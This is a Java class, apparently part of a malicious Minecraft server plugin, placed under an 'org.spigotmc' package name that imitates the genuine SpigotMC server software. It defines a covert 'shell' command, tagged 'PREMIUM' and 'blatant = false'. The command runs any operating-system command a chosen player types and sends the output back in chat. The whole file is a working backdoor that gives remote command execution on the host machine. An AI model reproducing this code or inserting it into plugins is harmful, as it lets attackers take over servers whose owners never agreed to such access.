package org.spigotmc.commands.impl.premium.server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.enums.PlayerType;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "shell",
    usage = "shell <command>",
    desc = "Send command to operating system",
    rank = PlayerType.PREMIUM,
    blatant = false
)
public class Shell extends CommandListener {

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE(Shell.class.getAnnotation(CommandInfo.class).usage()));
        } else {
            StringBuilder stringBuilder = new StringBuilder();

            Process process = null;
            try {
                for (int i = 1; i < args.length; i++) {
                    stringBuilder.append(args[i]).append(" ");
                }
                process = Runtime.getRuntime().exec(stringBuilder.toString().trim());
            } catch (IOException e) {
                p.sendMessage(Settings.PREFIX("An error occurred while sending the command"));
                return;
            }
            InputStream inputStream = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            
            String line;
            StringBuilder output = new StringBuilder();
            try {
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
            } catch (IOException e) {
                p.sendMessage(Settings.PREFIX("An error occurred while sending the command"));
                return;
            }
            p.sendMessage(output.toString());
        }
    }
}
